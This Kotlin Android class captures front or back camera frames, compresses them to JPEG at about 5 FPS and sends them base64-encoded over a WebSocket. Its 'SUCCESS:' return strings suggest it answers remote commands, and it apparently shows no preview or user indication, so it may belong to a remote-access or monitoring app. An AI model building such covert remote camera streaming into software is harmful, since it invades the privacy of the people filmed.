package com.kashem.shaikh.streaming

import android.content.Context
import android.graphics.ImageFormat
import android.graphics.Rect
import android.graphics.YuvImage
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.kashem.shaikh.services.AppLogs
import com.kashem.shaikh.services.WebSocketClient
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicLong

/**
 * Live camera → 5 FPS JPEG → WebSocket
 */
class CameraStreamer(
    private val context: Context,
    private val lifecycleOwner: LifecycleOwner
) {
    companion object {
        private const val JPEG_QUALITY = 40
        private const val FRAME_INTERVAL_MS = 200L // 5 FPS
    }

    private var provider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    @Volatile private var running = false
    @Volatile private var isFront = true
    @Volatile private var lastFrameTime = 0L

    // ✅ FIX: start/stop race guard
    private val generation = AtomicLong(0L)

    fun start(front: Boolean): String {
        if (running) stop()
        isFront = front
        running = true
        val myGen = generation.incrementAndGet()

        mainHandler.post {
            try {
                val future = ProcessCameraProvider.getInstance(context)
                future.addListener({
                    // ✅ FIX: stop() চললে abort
                    if (generation.get() != myGen) {
                        AppLogs.info("CameraStreamer: start gen=$myGen superseded, aborting")
                        return@addListener
                    }
                    try {
                        provider = future.get()
                        imageAnalysis = ImageAnalysis.Builder()
                            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                            .setTargetResolution(Size(640, 480))
                            .build()
                            .also { ia ->
                                ia.setAnalyzer(ContextCompat.getMainExecutor(context)) { proxy ->
                                    onFrame(proxy)
                                }
                            }

                        val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA
                                       else CameraSelector.DEFAULT_BACK_CAMERA

                        provider?.unbindAll()
                        provider?.bindToLifecycle(lifecycleOwner, selector, imageAnalysis)
                        AppLogs.info("CameraStreamer: started front=$front (gen=$myGen)")

                        try {
                            WebSocketClient.sendRaw(JSONObject().apply {
                                put("type", "camera_stream_info")
                                put("state", "start")
                                put("front", front)
                            }.toString())
                        } catch (_: Exception) {}
                    } catch (e: Exception) {
                        AppLogs.error("CameraStreamer bind failed", e)
                        running = false
                    }
                }, ContextCompat.getMainExecutor(context))
            } catch (e: Exception) {
                AppLogs.error("CameraStreamer start failed", e)
                running = false
            }
        }

        return "SUCCESS: Camera streaming started (front=$front)"
    }

    private fun onFrame(proxy: ImageProxy) {
        try {
            if (!running) { proxy.close(); return }
            val now = System.currentTimeMillis()
            if (now - lastFrameTime < FRAME_INTERVAL_MS) { proxy.close(); return }
            lastFrameTime = now

            val jpeg = imageProxyToJpeg(proxy)
            proxy.close()
            if (jpeg == null) return

            val b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
            try {
                WebSocketClient.sendRaw(JSONObject().apply {
                    put("type", "camera_frame")
                    put("front", isFront)
                    put("data", b64)
                }.toString())
            } catch (_: Exception) {}

        } catch (e: Exception) {
            AppLogs.error("CameraStreamer onFrame failed", e)
            try { proxy.close() } catch (_: Exception) {}
        }
    }

    private fun imageProxyToJpeg(image: ImageProxy): ByteArray? {
        return try {
            // ✅ FIX: YUYV (2-plane) device-এ crash এড়াতে
            if (image.planes.size < 3) {
                return null
            }

            val yBuffer = image.planes[0].buffer
            val uBuffer = image.planes[1].buffer
            val vBuffer = image.planes[2].buffer
            val ySize = yBuffer.remaining()
            val uSize = uBuffer.remaining()
            val vSize = vBuffer.remaining()
            val nv21 = ByteArray(ySize + uSize + vSize)
            yBuffer.get(nv21, 0, ySize)
            vBuffer.get(nv21, ySize, vSize)
            uBuffer.get(nv21, ySize + vSize, uSize)

            val yuv = YuvImage(nv21, ImageFormat.NV21, image.width, image.height, null)
            val out = ByteArrayOutputStream()
            yuv.compressToJpeg(Rect(0, 0, image.width, image.height), JPEG_QUALITY, out)
            out.toByteArray()
        } catch (_: Exception) {
            null
        }
    }

    fun stop(): String {
        // ✅ FIX: pending bind cancel
        generation.incrementAndGet()

        if (!running) return "SUCCESS: Camera stream not running"
        running = false

        mainHandler.post {
            try { provider?.unbindAll() } catch (_: Exception) {}
            imageAnalysis = null
            provider = null
        }

        try {
            WebSocketClient.sendRaw(JSONObject().apply {
                put("type", "camera_stream_info")
                put("state", "stop")
            }.toString())
        } catch (_: Exception) {}

        AppLogs.info("CameraStreamer: stopped")
        return "SUCCESS: Camera streaming stopped"
    }

    fun isRunning(): Boolean = running
}